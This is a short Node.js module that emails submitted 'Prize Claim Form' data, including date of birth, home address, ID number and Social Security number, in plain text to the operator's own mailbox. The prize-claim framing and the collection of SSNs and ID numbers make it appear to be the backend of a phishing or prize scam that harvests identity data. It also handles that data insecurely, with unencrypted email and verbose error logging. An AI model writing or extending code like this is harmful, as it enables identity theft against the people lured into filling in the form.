const transporter = require('../config/emailConfig');

const sendEmail = async (formData) => {
    try {
        // Test the connection first
        await transporter.verify();
        console.log('SMTP connection verified');

        // Create email content
        const emailContent = `
            New Form Submission:
            
            Personal Information:
            --------------------
            Name: ${formData.firstName} ${formData.lastName}
            Email: ${formData.email}
            Phone: ${formData.phone}
            DOB: ${formData.dob}
            Gender: ${formData.gender}
            
            Address Information:
            -------------------
            Street: ${formData.street}
            City: ${formData.city}
            State: ${formData.state}
            ZIP: ${formData.zipCode}
            Country: ${formData.country}
            
            Additional Information:
            ---------------------
            Marital Status: ${formData.maritalStatus}
            Occupation: ${formData.occupation}
            ID Type: ${formData.idType}
            ID Number: ${formData.idNumber}
            SSN: ${formData.ssn}
            
            Submission Time: ${new Date().toLocaleString()}
        `;

        console.log('Attempting to send email...');

        // Email options
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: 'New Prize Claim Form Submission',
            text: emailContent
        };

        // Send email
        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent successfully:', info.messageId);
        return { success: true, messageId: info.messageId };

    } catch (error) {
        console.error('Detailed email error:', error);
        return { 
            success: false, 
            error: `Email sending failed: ${error.message}`,
            details: error
        };
    }
};

module.exports = { sendEmail };
